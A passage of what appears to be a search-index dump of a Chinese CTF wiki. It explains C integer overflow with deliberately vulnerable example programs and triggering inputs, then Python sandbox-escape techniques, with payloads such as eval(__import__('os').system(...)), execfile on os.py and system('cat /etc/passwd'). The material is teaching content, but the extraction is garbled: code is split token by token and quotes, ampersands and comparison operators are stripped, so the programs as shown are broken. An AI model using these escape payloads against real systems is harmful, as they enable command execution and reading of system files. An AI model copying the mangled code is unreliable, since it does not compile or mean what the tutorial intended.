32767\n\u3002\n\n\n\u4f8b\u5b50\n\n\n\u5728\u6211\u89c1\u8fc7\u7684\u6574\u6570\u6ea2\u51fa\u7684\u6f0f\u6d1e\u4e2d\uff0c\u6211\u8ba4\u4e3a\u53ef\u4ee5\u603b\u7ed3\u4e3a\u4e24\u79cd\u60c5\u51b5\u3002\n\n\n\u672a\u9650\u5236\u8303\u56f4\n\n\n\u8fd9\u79cd\u60c5\u51b5\u5f88\u597d\u7406\u89e3\uff0c\u6bd4\u5982\u6709\u4e00\u4e2a\u56fa\u5b9a\u5927\u5c0f\u7684\u6876\uff0c\u5f80\u91cc\u9762\u5012\u6c34\uff0c\u5982\u679c\u4f60\u6ca1\u6709\u9650\u5236\u5012\u5165\u591a\u5c11\u6c34\uff0c\u90a3\u4e48\u6c34\u5219\u4f1a\u4ece\u6876\u4e2d\u6ea2\u51fa\u6765\u3002\n\n\n\u4e00\u4e2a\u6709\u56fa\u5b9a\u5927\u5c0f\u7684\u4e1c\u897f\uff0c\u4f60\u6ca1\u6709\u5bf9\u5176\u8fdb\u884c\u7ea6\u675f\uff0c\u5c31\u4f1a\u9020\u6210\u4e0d\u53ef\u9884\u671f\u7684\u540e\u679c\u3002\n\n\n\u7b80\u5355\u7684\u5199\u4e00\u4e2a\u793a\u4f8b:\n\n\n$\n \ncat\n \ntest\n.\nc\n\n\n#include\nstddef.h\n\n\nint\n \nmain\n(\nvoid\n)\n\n\n{\n\n    \nint\n \nlen\n;\n\n    \nint\n \ndata_len\n;\n\n    \nint\n \nheader_len\n;\n\n    \nchar\n \n*\nbuf\n;\n\n\n    \nheader_len\n \n=\n \n0x10\n;\n\n    \nscanf\n(\n%uld\n,\n \ndata_len\n);\n\n\n    \nlen\n \n=\n \ndata_len\n+\nheader_len\n\n    \nbuf\n \n=\n \nmalloc\n(\nlen\n);\n\n    \nread\n(\n0\n,\n \nbuf\n,\n \ndata_len\n);\n\n    \nreturn\n \n0\n;\n\n\n}\n\n\n$\n \ngcc\n \ntest\n.\nc\n\n\n$\n \n.\n/\na\n.\nout\n\n\n-\n1\n\n\nasdfasfasdfasdfafasfasfasdfasdf\n\n\n# gdb a.out\n\n\n\u25ba\n \n0x40066d\n \nmain\n+\n71\n    \ncall\n   \nmalloc\n@\nplt\n \n0x400500\n\n        \nsize\n:\n \n0xf\n\n\n\n\n\n\u53ea\u7533\u8bf7 \n0x20\n \u5927\u5c0f\u7684\u5806\uff0c\u4f46\u662f\u5374\u80fd\u8f93\u5165 \n0xffffffff\n \u957f\u5ea6\u7684\u6570\u636e\uff0c\u4ece\u6574\u578b\u6ea2\u51fa\u5230\u5806\u6ea2\u51fa\n\n\n\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362\n\n\n\u5373\u4f7f\u6b63\u786e\u7684\u5bf9\u53d8\u91cf\u8fdb\u884c\u7ea6\u675f\uff0c\u4e5f\u4ecd\u7136\u6709\u53ef\u80fd\u51fa\u73b0\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6211\u8ba4\u4e3a\u53ef\u4ee5\u6982\u62ec\u4e3a\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u5982\u679c\u7ee7\u7eed\u7ec6\u5206\u4e0b\u53bb\uff0c\u53ef\u4ee5\u5206\u4e3a\uff1a\n\n\n\n\n\u8303\u56f4\u5927\u7684\u53d8\u91cf\u8d4b\u503c\u7ed9\u8303\u56f4\u5c0f\u7684\u53d8\u91cf\n\n\n\n\n$\n \ncat\n \ntest2\n.\nc\n\n\nvoid\n \ncheck\n(\nint\n \nn\n)\n\n\n{\n\n    \nif\n \n(\n!\nn\n)\n\n        \nprintf\n(\nvuln\n);\n\n    \nelse\n\n        \nprintf\n(\nOK\n);\n\n\n}\n\n\n\nint\n \nmain\n(\nvoid\n)\n\n\n{\n\n    \nlong\n \nint\n \na\n;\n\n\n    \nscanf\n(\n%ld\n,\n \na\n);\n\n    \nif\n \n(\na\n \n==\n \n0\n)\n\n        \nprintf\n(\nBad\n);\n\n    \nelse\n\n        \ncheck\n(\na\n);\n\n    \nreturn\n \n0\n;\n\n\n}\n\n\n$\n \ngcc\n \ntest2\n.\nc\n\n\n$\n \n.\n/\na\n.\nout\n\n\n4294967296\n\n\nvuln\n\n\n\n\n\n\u4e0a\u8ff0\u4ee3\u7801\u5c31\u662f\u4e00\u4e2a\u8303\u56f4\u5927\u7684\u53d8\u91cf(\u957f\u6574\u578ba)\uff0c\u4f20\u5165 check \u51fd\u6570\u540e\u53d8\u4e3a\u8303\u56f4\u5c0f\u7684\u53d8\u91cf(\u6574\u578b\u53d8\u91cfn)\uff0c\u9020\u6210\u6574\u6570\u6ea2\u51fa\u7684\u4f8b\u5b50\u3002\n\n\n\u5df2\u7ecf\u957f\u6574\u578b\u7684\u5360\u6709 8 byte \u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u800c\u6574\u578b\u53ea\u6709 4 byte \u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u6240\u4ee5\u5f53 long -\n int\uff0c\u5c06\u4f1a\u9020\u6210\u622a\u65ad\uff0c\u53ea\u628a\u957f\u6574\u578b\u7684\u4f4e 4byte \u7684\u503c\u4f20\u7ed9\u6574\u578b\u53d8\u91cf\u3002\n\n\n\u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\uff0c\u5c31\u662f\u628a \nlong: 0x100000000 -\n int: 0x00000000\n\u3002\n\n\n\u4f46\u662f\u5f53\u8303\u56f4\u66f4\u5c0f\u7684\u53d8\u91cf\u5c31\u80fd\u5b8c\u5168\u7684\u628a\u503c\u4f20\u9012\u7ed9\u8303\u56f4\u66f4\u5927\u7684\u53d8\u91cf\uff0c\u800c\u4e0d\u4f1a\u9020\u6210\u6570\u636e\u4e22\u5931\u3002\n\n\n\n\n\u53ea\u505a\u4e86\u5355\u8fb9\u9650\u5236\n\n\n\n\n\u8fd9\u79cd\u60c5\u51b5\u53ea\u9488\u5bf9\u6709\u7b26\u53f7\u7c7b\u578b\n\n\n$\n \ncat\n \ntest3\n.\nc\n\n\nint\n \nmain\n(\nvoid\n)\n\n\n{\n\n    \nint\n \nlen\n,\n \nl\n;\n\n    \nchar\n \nbuf\n[\n11\n];\n\n\n    \nscanf\n(\n%d\n,\n \nlen\n);\n\n    \nif\n \n(\nlen\n \n \n10\n)\n \n{\n\n        \nl\n \n=\n \nread\n(\n0\n,\n \nbuf\n,\n \nlen\n);\n\n        \n*\n(\nbuf\n+\nl\n)\n \n=\n \n0\n;\n\n        \nputs\n(\nbuf\n);\n\n    \n}\n \nelse\n\n        \nprintf\n(\nPlease len \n 10\n);\n        \n\n}\n\n\n$\n \ngcc\n \ntest3\n.\nc\n\n\n$\n \n.\n/\na\n.\nout\n\n\n-\n1\n\n\naaaaaaaaaaaa\n\n\naaaaaaaaaaaa\n\n\n\n\n\n\u4ece\u8868\u9762\u4e0a\u770b\uff0c\u6211\u4eec\u5bf9\u53d8\u91cf len \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u4f46\u662f\u4ed4\u7ec6\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\uff0clen \u662f\u6709\u7b26\u53f7\u6574\u578b\uff0c\u6240\u4ee5 len \u7684\u957f\u5ea6\u53ef\u4ee5\u4e3a\u8d1f\u6570\uff0c\u4f46\u662f\u5728 read \u51fd\u6570\u4e2d\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u7c7b\u578b\u662f \nsize_t\n\uff0c\u8be5\u7c7b\u578b\u76f8\u5f53\u4e8e \nunsigned long int\n\uff0c\u5c5e\u4e8e\u65e0\u7b26\u53f7\u957f\u6574\u578b\n\n\n\u4e0a\u9762\u4e3e\u4f8b\u7684\u4e24\u79cd\u60c5\u51b5\u90fd\u6709\u4e00\u4e2a\u5171\u6027\uff0c\u5c31\u662f\u51fd\u6570\u7684\u5f62\u53c2\u548c\u5b9e\u53c2\u7684\u7c7b\u578b\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u8ba4\u4e3a\u53ef\u4ee5\u603b\u7ed3\u4e3a\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362\n\n\nCTF\u4f8b\u9898\n\n\n\u9898\u76ee\uff1a\nPwnhub \u6545\u4e8b\u7684\u5f00\u59cb calc", 
            "title": "\u6574\u6570\u6ea2\u51fa\u539f\u7406\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/integeroverflow/intof/#_1", 
            "text": "", 
            "title": "\u6574\u6570\u6ea2\u51fa"
        }, 
        {
            "location": "/pwn/integeroverflow/intof/#_2", 
            "text": "\u5728C\u8bed\u8a00\u4e2d\uff0c\u6574\u6570\u7684\u57fa\u672c\u6570\u636e\u7c7b\u578b\u5206\u4e3a\u77ed\u6574\u578b(short)\uff0c\u6574\u578b(int)\uff0c\u957f\u6574\u578b(long)\uff0c\u8fd9\u4e09\u4e2a\u6570\u636e\u7c7b\u578b\u8fd8\u5206\u4e3a\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\uff0c\u6bcf\u79cd\u6570\u636e\u7c7b\u578b\u90fd\u6709\u5404\u81ea\u7684\u5927\u5c0f\u8303\u56f4\uff0c(\u56e0\u4e3a\u6570\u636e\u7c7b\u578b\u7684\u5927\u5c0f\u8303\u56f4\u662f\u7f16\u8bd1\u5668\u51b3\u5b9a\u7684\uff0c\u6240\u4ee5\u4e4b\u540e\u6240\u8ff0\u90fd\u9ed8\u8ba4\u662f 64 \u4f4d\u4e0b\u4f7f\u7528 gcc-5.4)\uff0c\u5982\u4e0b\u6240\u793a:     \u7c7b\u578b  \u5b57\u8282  \u8303\u56f4      short int  2byte(word)  0~32767(0~0x7fff)   -32768~-1(0x8000~0xffff)    unsigned short int  2byte(word)  0~65535(0~0xffff)    int  4byte(dword)  0~2147483647(0~0x7fffffff)   -2147483648~-1(0x80000000~0xffffffff)    unsigned int  4byte(dword)  0~4294967295(0~0xffffffff)    long int  8byte(qword)  \u6b63: 0~0x7fffffffffffffff   \u8d1f:0x8000000000000000~0xffffffffffffffff    unsigned long int  8byte(qword)  0~0xffffffffffffffff     \u5f53\u7a0b\u5e8f\u4e2d\u7684\u6570\u636e\u8d85\u8fc7\u5176\u6570\u636e\u7c7b\u578b\u7684\u8303\u56f4\uff0c\u5219\u4f1a\u9020\u6210\u6ea2\u51fa\uff0c\u6574\u6570\u7c7b\u578b\u7684\u6ea2\u51fa\u88ab\u79f0\u4e3a\u6574\u6570\u6ea2\u51fa\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/integeroverflow/intof/#_3", 
            "text": "\u63a5\u4e0b\u6765\u7b80\u5355\u9610\u8ff0\u4e0b\u6574\u6570\u6ea2\u51fa\u7684\u539f\u7406", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/integeroverflow/intof/#_4", 
            "text": "# \u4f2a\u4ee3\u7801\nshort int a;\n\na = a + 1;\n# \u5bf9\u5e94\u7684\u6c47\u7f16\nmovzx  eax, word ptr [rbp - 0x1c]\nadd    eax, 1\nmov    word ptr [rbp - 0x1c], ax\n\nunsigned short int b;\n\nb = b + 1;\n# assembly code\nadd    word ptr [rbp - 0x1a], 1  \u4e0a\u754c\u6ea2\u51fa\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u79cd\u662f  0x7fff + 1 \uff0c \u53e6\u4e00\u79cd\u662f  0xffff + 1 \u3002  \u56e0\u4e3a\u8ba1\u7b97\u673a\u5e95\u5c42\u6307\u4ee4\u662f\u4e0d\u533a\u5206\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u7684\uff0c\u6570\u636e\u90fd\u662f\u4ee5\u4e8c\u8fdb\u5236\u5f62\u5f0f\u5b58\u5728(\u7f16\u8bd1\u5668\u7684\u5c42\u9762\u624d\u5bf9\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u8fdb\u884c\u533a\u5206\uff0c\u4ea7\u751f\u4e0d\u540c\u7684\u6c47\u7f16\u6307\u4ee4)\u3002  \u6240\u4ee5  add 0x7fff, 1 == 0x8000 \uff0c\u8fd9\u79cd\u4e0a\u754c\u6ea2\u51fa\u5bf9\u65e0\u7b26\u53f7\u6574\u578b\u5c31\u6ca1\u6709\u5f71\u54cd\uff0c\u4f46\u662f\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c 0x7fff  \u8868\u793a\u7684\u662f  32767 \uff0c\u4f46\u662f  0x8000  \u8868\u793a\u7684\u662f  -32768 \uff0c\u7528\u6570\u5b66\u8868\u8fbe\u5f0f\u6765\u8868\u793a\u5c31\u662f\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d  32767+1 == -32768 \u3002  \u7b2c\u4e8c\u79cd\u60c5\u51b5\u662f  add 0xffff, 1 \uff0c\u8fd9\u79cd\u60c5\u51b5\u9700\u8981\u8003\u8651\u7684\u662f\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u6570\u3002  \u6bd4\u5982\u4e0a\u9762\u7684\u6709\u7b26\u53f7\u578b\u52a0\u6cd5\u7684\u6c47\u7f16\u4ee3\u7801\u662f  add eax, 1 \uff0c\u56e0\u4e3a  eax=0xffff \uff0c\u6240\u4ee5  add eax, 1 == 0x10000 \uff0c\u4f46\u662f\u65e0\u7b26\u53f7\u7684\u6c47\u7f16\u4ee3\u7801\u662f\u5bf9\u5185\u5b58\u8fdb\u884c\u52a0\u6cd5\u8fd0\u7b97  add word ptr [rbp - 0x1a], 1 == 0x0000 \u3002  \u5728\u6709\u7b26\u53f7\u7684\u52a0\u6cd5\u4e2d\uff0c\u867d\u7136  eax  \u7684\u7ed3\u679c\u4e3a 0x10000\uff0c\u4f46\u662f\u53ea\u628a  ax=0x0000  \u7684\u503c\u50a8\u5b58\u5230\u4e86\u5185\u5b58\u4e2d\uff0c\u4ece\u7ed3\u679c\u770b\u548c\u65e0\u7b26\u53f7\u662f\u4e00\u6837\u7684\u3002  \u518d\u4ece\u6570\u5b57\u5c42\u9762\u770b\u770b\u8fd9\u79cd\u6ea2\u51fa\u7684\u7ed3\u679c\uff0c\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c 0xffff==-1\uff0c-1 + 1 == 0 \uff0c\u4ece\u6709\u7b26\u53f7\u770b\u8fd9\u79cd\u8ba1\u7b97\u6ca1\u95ee\u9898\u3002  \u4f46\u662f\u5728\u65e0\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c 0xffff == 65535, 65535 + 1 == 0 \u3002", 
            "title": "\u4e0a\u754c\u6ea2\u51fa"
        }, 
        {
            "location": "/pwn/integeroverflow/intof/#_5", 
            "text": "\u4e0b\u5c4a\u6ea2\u51fa\u7684\u9053\u7406\u548c\u4e0a\u754c\u6ea2\u51fa\u4e00\u6837\uff0c\u5728\u6c47\u7f16\u4ee3\u7801\u4e2d\uff0c\u53ea\u662f\u628a  add  \u66ff\u6362\u6210\u4e86  sub \u3002  \u4e00\u6837\u4e5f\u662f\u6709\u4e24\u79cd\u60c5\u51b5\uff1a  \u7b2c\u4e00\u79cd\u662f  sub 0x0000, 1 == 0xffff \uff0c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6765\u8bf4  0 - 1 == -1  \u6ca1\u95ee\u9898\uff0c\u4f46\u662f\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6765\u8bf4\u5c31\u6210\u4e86  0 - 1 == 65535 \u3002  \u7b2c\u4e8c\u79cd\u662f  sub 0x8000, 1 == 0x7fff \uff0c\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6765\u8bf4\u662f  32768 - 1 == 32767  \u662f\u6b63\u786e\u7684\uff0c\u4f46\u662f\u5bf9\u4e8e\u6709\u7b26\u53f7\u6765\u8bf4\u5c31\u53d8\u6210\u4e86  -32768 - 1 = 32767 \u3002", 
            "title": "\u4e0b\u754c\u6ea2\u51fa"
        }, 
        {
            "location": "/pwn/integeroverflow/intof/#_6", 
            "text": "\u5728\u6211\u89c1\u8fc7\u7684\u6574\u6570\u6ea2\u51fa\u7684\u6f0f\u6d1e\u4e2d\uff0c\u6211\u8ba4\u4e3a\u53ef\u4ee5\u603b\u7ed3\u4e3a\u4e24\u79cd\u60c5\u51b5\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/integeroverflow/intof/#_7", 
            "text": "\u8fd9\u79cd\u60c5\u51b5\u5f88\u597d\u7406\u89e3\uff0c\u6bd4\u5982\u6709\u4e00\u4e2a\u56fa\u5b9a\u5927\u5c0f\u7684\u6876\uff0c\u5f80\u91cc\u9762\u5012\u6c34\uff0c\u5982\u679c\u4f60\u6ca1\u6709\u9650\u5236\u5012\u5165\u591a\u5c11\u6c34\uff0c\u90a3\u4e48\u6c34\u5219\u4f1a\u4ece\u6876\u4e2d\u6ea2\u51fa\u6765\u3002  \u4e00\u4e2a\u6709\u56fa\u5b9a\u5927\u5c0f\u7684\u4e1c\u897f\uff0c\u4f60\u6ca1\u6709\u5bf9\u5176\u8fdb\u884c\u7ea6\u675f\uff0c\u5c31\u4f1a\u9020\u6210\u4e0d\u53ef\u9884\u671f\u7684\u540e\u679c\u3002  \u7b80\u5355\u7684\u5199\u4e00\u4e2a\u793a\u4f8b:  $   cat   test . c  #include stddef.h  int   main ( void )  { \n     int   len ; \n     int   data_len ; \n     int   header_len ; \n     char   * buf ; \n\n     header_len   =   0x10 ; \n     scanf ( %uld ,   data_len ); \n\n     len   =   data_len + header_len \n     buf   =   malloc ( len ); \n     read ( 0 ,   buf ,   data_len ); \n     return   0 ;  }  $   gcc   test . c  $   . / a . out  - 1  asdfasfasdfasdfafasfasfasdfasdf  # gdb a.out  \u25ba   0x40066d   main + 71      call     malloc @ plt   0x400500 \n         size :   0xf   \u53ea\u7533\u8bf7  0x20  \u5927\u5c0f\u7684\u5806\uff0c\u4f46\u662f\u5374\u80fd\u8f93\u5165  0xffffffff  \u957f\u5ea6\u7684\u6570\u636e\uff0c\u4ece\u6574\u578b\u6ea2\u51fa\u5230\u5806\u6ea2\u51fa", 
            "title": "\u672a\u9650\u5236\u8303\u56f4"
        }, 
        {
            "location": "/pwn/integeroverflow/intof/#_8", 
            "text": "\u5373\u4f7f\u6b63\u786e\u7684\u5bf9\u53d8\u91cf\u8fdb\u884c\u7ea6\u675f\uff0c\u4e5f\u4ecd\u7136\u6709\u53ef\u80fd\u51fa\u73b0\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6211\u8ba4\u4e3a\u53ef\u4ee5\u6982\u62ec\u4e3a\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u5982\u679c\u7ee7\u7eed\u7ec6\u5206\u4e0b\u53bb\uff0c\u53ef\u4ee5\u5206\u4e3a\uff1a   \u8303\u56f4\u5927\u7684\u53d8\u91cf\u8d4b\u503c\u7ed9\u8303\u56f4\u5c0f\u7684\u53d8\u91cf   $   cat   test2 . c  void   check ( int   n )  { \n     if   ( ! n ) \n         printf ( vuln ); \n     else \n         printf ( OK );  }  int   main ( void )  { \n     long   int   a ; \n\n     scanf ( %ld ,   a ); \n     if   ( a   ==   0 ) \n         printf ( Bad ); \n     else \n         check ( a ); \n     return   0 ;  }  $   gcc   test2 . c  $   . / a . out  4294967296  vuln   \u4e0a\u8ff0\u4ee3\u7801\u5c31\u662f\u4e00\u4e2a\u8303\u56f4\u5927\u7684\u53d8\u91cf(\u957f\u6574\u578ba)\uff0c\u4f20\u5165 check \u51fd\u6570\u540e\u53d8\u4e3a\u8303\u56f4\u5c0f\u7684\u53d8\u91cf(\u6574\u578b\u53d8\u91cfn)\uff0c\u9020\u6210\u6574\u6570\u6ea2\u51fa\u7684\u4f8b\u5b50\u3002  \u5df2\u7ecf\u957f\u6574\u578b\u7684\u5360\u6709 8 byte \u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u800c\u6574\u578b\u53ea\u6709 4 byte \u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u6240\u4ee5\u5f53 long -  int\uff0c\u5c06\u4f1a\u9020\u6210\u622a\u65ad\uff0c\u53ea\u628a\u957f\u6574\u578b\u7684\u4f4e 4byte \u7684\u503c\u4f20\u7ed9\u6574\u578b\u53d8\u91cf\u3002  \u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\uff0c\u5c31\u662f\u628a  long: 0x100000000 -  int: 0x00000000 \u3002  \u4f46\u662f\u5f53\u8303\u56f4\u66f4\u5c0f\u7684\u53d8\u91cf\u5c31\u80fd\u5b8c\u5168\u7684\u628a\u503c\u4f20\u9012\u7ed9\u8303\u56f4\u66f4\u5927\u7684\u53d8\u91cf\uff0c\u800c\u4e0d\u4f1a\u9020\u6210\u6570\u636e\u4e22\u5931\u3002   \u53ea\u505a\u4e86\u5355\u8fb9\u9650\u5236   \u8fd9\u79cd\u60c5\u51b5\u53ea\u9488\u5bf9\u6709\u7b26\u53f7\u7c7b\u578b  $   cat   test3 . c  int   main ( void )  { \n     int   len ,   l ; \n     char   buf [ 11 ]; \n\n     scanf ( %d ,   len ); \n     if   ( len     10 )   { \n         l   =   read ( 0 ,   buf ,   len ); \n         * ( buf + l )   =   0 ; \n         puts ( buf ); \n     }   else \n         printf ( Please len   10 );          }  $   gcc   test3 . c  $   . / a . out  - 1  aaaaaaaaaaaa  aaaaaaaaaaaa   \u4ece\u8868\u9762\u4e0a\u770b\uff0c\u6211\u4eec\u5bf9\u53d8\u91cf len \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u4f46\u662f\u4ed4\u7ec6\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\uff0clen \u662f\u6709\u7b26\u53f7\u6574\u578b\uff0c\u6240\u4ee5 len \u7684\u957f\u5ea6\u53ef\u4ee5\u4e3a\u8d1f\u6570\uff0c\u4f46\u662f\u5728 read \u51fd\u6570\u4e2d\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u7c7b\u578b\u662f  size_t \uff0c\u8be5\u7c7b\u578b\u76f8\u5f53\u4e8e  unsigned long int \uff0c\u5c5e\u4e8e\u65e0\u7b26\u53f7\u957f\u6574\u578b  \u4e0a\u9762\u4e3e\u4f8b\u7684\u4e24\u79cd\u60c5\u51b5\u90fd\u6709\u4e00\u4e2a\u5171\u6027\uff0c\u5c31\u662f\u51fd\u6570\u7684\u5f62\u53c2\u548c\u5b9e\u53c2\u7684\u7c7b\u578b\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u8ba4\u4e3a\u53ef\u4ee5\u603b\u7ed3\u4e3a\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362", 
            "title": "\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362"
        }, 
        {
            "location": "/pwn/integeroverflow/intof/#ctf", 
            "text": "\u9898\u76ee\uff1a Pwnhub \u6545\u4e8b\u7684\u5f00\u59cb calc", 
            "title": "CTF\u4f8b\u9898"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/", 
            "text": "Python\u6c99\u76d2\n\n\n\u6240\u8c13\u7684 Python \u6c99\u76d2\uff0c\u5373\u4ee5\u4e00\u5b9a\u7684\u65b9\u6cd5\u6a21\u62df Python \u7ec8\u7aef\uff0c\u5b9e\u73b0\u7528\u6237\u5bf9 Python \u7684\u4f7f\u7528\u3002\n\n\nPython\u6c99\u7bb1\u9003\u9038\u7684\u4e00\u4e9b\u65b9\u6cd5\n\n\n\u6211\u4eec\u901a\u5e38\u6240\u8bf4\u7684 Python \u6c99\u7bb1\u9003\u9038\u5c31\u662f\u7ed5\u8fc7\u6a21\u62df\u7684 Python \u7ec8\u7aef\uff0c\u6700\u7ec8\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u3002\n\n\n\u5bfc\u5165\u6a21\u5757\n\n\n\u5728 Python \u7684\u5185\u5efa\u51fd\u6570\u4e2d\uff0c\u6709\u4e00\u4e9b\u51fd\u6570\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5b9e\u73b0\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff1a\n\nos.system() os.popen()\ncommands.getstatusoutput() commands.getoutput()\ncommands.getstatus()\nsubprocess.call(command, shell=True) subprocess.Popen(command, shell=True)\npty.spawn()\n\n\n\u5728 Python \u4e2d\u5bfc\u5165\u6a21\u5757\u7684\u65b9\u6cd5\u901a\u5e38\u6709\u4e09\u79cd(xxx\u4e3a\u6a21\u5757\u540d\u79f0\uff09)\uff1a\n1. import xxx\n2. from xxx import *\n3. \nimport\n('xxx')   \n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0a\u8ff0\u7684\u5bfc\u5165\u65b9\u6cd5\uff0c\u5bfc\u5165\u76f8\u5173\u6a21\u5757\u5e76\u4f7f\u7528\u4e0a\u8ff0\u7684\u51fd\u6570\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u3002\n\u9664\u6b64\u4e4b\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\n\u901a\u8fc7\u8def\u5f84\u5f15\u5165\u6a21\u5757\n\uff1a\n\u5982\u5728 linux \u7cfb\u7edf\u4e2d Python \u7684 os \u6a21\u5757\u7684\u8def\u5f84\u4e00\u822c\u90fd\u662f\u5728 /usr/lib/python2.7/os.py \uff0c\u5f53\u77e5\u9053\u8def\u5f84\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u64cd\u4f5c\u5bfc\u5165\u6a21\u5757\uff0c\u7136\u540e\u8fdb\u4e00\u6b65\u4f7f\u7528\u76f8\u5173\u51fd\u6570\u3002\n\n \nimport\n \nsys\n\n\n \nsys\n.\nmodules\n[\nos\n]\n=\n/usr/lib/python2.7/os.py\n\n\n \nimport\n \nos\n\n\n\n\n\n\n\u5176\u4ed6\u7684\u5371\u9669\u51fd\u6570\u4e3e\u4f8b\n\n\u5982 \nexecfile\n \u6587\u4ef6\u6267\u884c\n\n \nexecfile\n(\n/usr/lib/python2.7/os.py\n)\n\n\n \nsystem\n(\ncat /etc/passwd\n)\n\n\nroot\n:\nx\n:\n0\n:\n0\n:\nroot\n:\n/\nroot\n:\n/\nbin\n/\nbash\n\n\ndaemon\n:\nx\n:\n1\n:\n1\n:\ndaemon\n:\n/\nusr\n/\nsbin\n:\n/\nusr\n/\nsbin\n/\nnologin\n\n\nbin\n:\nx\n:\n2\n:\n2\n:\nbin\n:\n/\nbin\n:\n/\nusr\n/\nsbin\n/\nnologin\n\n\nsys\n:\nx\n:\n3\n:\n3\n:\nsys\n:\n/\ndev\n:\n/\nusr\n/\nsbin\n/\nnologin\n\n\n...\n\n\n \ngetcwd\n()\n\n\n/usr/lib/python2.7\n\n\n\n\ntimeit\n\n\nimport\n \ntimeit\n\n\ntimeit\n.\ntimeit\n(\n__import__(\nos\n).system(\ndir\n)\n,\nnumber\n=\n1\n)\n\n\n\n\n exec \u548c eval \u6bd4\u8f83\u7ecf\u5178\u4e86\n\n\neval\n(\n__import__(\nos\n).system(\ndir\n)\n)\n\n\n\n\nplatform\n\n\nimport\n \nplatform\n\n\nprint\n \nplatform\n.\npopen\n(\ndir\n)\n.\nread\n()\n\n\n\n\n\u4f46\u662f\uff0c\u6b63\u5e38\u7684 Python \u6c99\u7bb1\u4f1a\u4ee5\u9ed1\u540d\u5355\u7684\u5f62\u5f0f\u7981\u6b62\u4f7f\u7528\u4e00\u4e9b\u6a21\u5757\u5982 os \u6216\u4ee5\u767d\u540d\u5355\u7684\u5f62\u5f0f\u53ea\u5141\u8bb8\u7528\u6237\u4f7f\u7528\u6c99\u7bb1\u63d0\u4f9b\u7684\u6a21\u5757\uff0c\u7528\u4ee5\u963b\u6b62\u7528\u6237\u7684\u5371\u9669\u64cd\u4f5c\u3002\u800c\u5982\u4f55\u8fdb\u4e00\u6b65\u9003\u9038\u6c99\u7bb1\u5c31\u662f\u6211\u4eec\u7684\u91cd\u70b9\u7814\u7a76\u5185\u5bb9\u3002\n\n\nPython \u7684\u5185\u5efa\u51fd\u6570\n\n\n\u5f53\u6211\u4eec\u4e0d\u80fd\u5bfc\u5165\u6a21\u5757\uff0c\u6216\u8005\u60f3\u8981\u5bfc\u5165\u7684\u6a21\u5757\u88ab\u7981\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u80fd\u5bfb\u6c42 Python \u672c\u8eab\u5185\u7f6e\u51fd\u6570\uff08\u5373\u901a\u5e38\u4e0d\u7528\u4eba\u4e3a\u5bfc\u5165\uff0cPython\u672c\u8eab\u9ed8\u8ba4\u5df2\u7ecf\u5bfc\u5165\u7684\u51fd\u6570\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u53ef\u4ee5\u901a\u8fc7 \ndir __builtin__\n \u6765\u83b7\u53d6\u5185\u7f6e\u51fd\u6570\u5217\u8868\n\n \ndir\n(\n__builtins__\n)\n\n\n[\nArithmeticError\n,\n \nAssertionError\n,\n \nAttributeError\n,\n \nBaseException\n,\n \nBufferError\n,\n \nBytesWarning\n,\n \nDeprecationWarning\n,\n \nEOFError\n,\n \nEllipsis\n,\n \nEnvironmentError\n,\n \nException\n,\n \nFalse\n,\n \nFloatingPointError\n,\n \nFutureWarning\n,\n \nGeneratorExit\n,\n \nIOError\n,\n \nImportError\n,\n \nImportWarning\n,\n \nIndentationError\n,\n \nIndexError\n,\n \nKeyError\n,\n \nKeyboardInterrupt\n,\n \nLookupError\n,\n \nMemoryError\n,\n \nNameError\n,\n \nNone\n,\n \nNotImplemented\n,\n \nNotImplementedError\n,\n \nOSError\n,\n \nOverflowError\n,\n \nPendingDeprecationWarning\n,\n 